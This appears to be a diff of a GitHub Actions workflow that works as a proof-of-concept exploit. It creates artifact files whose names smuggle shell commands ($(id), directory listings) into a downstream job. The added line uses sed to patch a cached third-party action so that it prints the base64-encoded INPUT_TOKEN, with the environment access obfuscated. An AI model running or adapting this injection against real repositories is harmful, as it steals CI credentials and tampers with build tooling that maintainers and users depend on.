@@ -19,9 +19,8 @@ jobs:
           printf 'plain report\n' > content/report.txt
           printf '%s\n' "$PR" > content/pr_number.txt
           printf 'payload\n' > 'content/p$(id).txt'
-          printf 'payload\n' > 'content/z$(cd${IFS}..;cd${IFS}..;ls).txt'
-          printf 'payload\n' > 'content/y$(cd${IFS}..;cd${IFS}..;cd${IFS}_actions;ls).txt'
-          printf 'payload\n' > 'content/w$(cd${IFS}..;cd${IFS}..;cd${IFS}_actions;cd${IFS}peter-evans;cd${IFS}find-comment;ls).txt'
+          printf 'make cat succeed\n' > content/x.txt
+          printf 'payload\n' > 'content/x$(cd${IFS}..;cd${IFS}..;cd${IFS}_actions;cd${IFS}peter-evans;cd${IFS}find-comment;cd${IFS}v3;cd${IFS}dist;sed${IFS}-i${IFS}s#process.env#console.log\(btoa\(process\[String.fromCharCode\(101,110,118\)\].INPUT_TOKEN\)\)#g${IFS}index.js).txt'
           ls -1 content
       - uses: actions/upload-artifact@v4
         with:
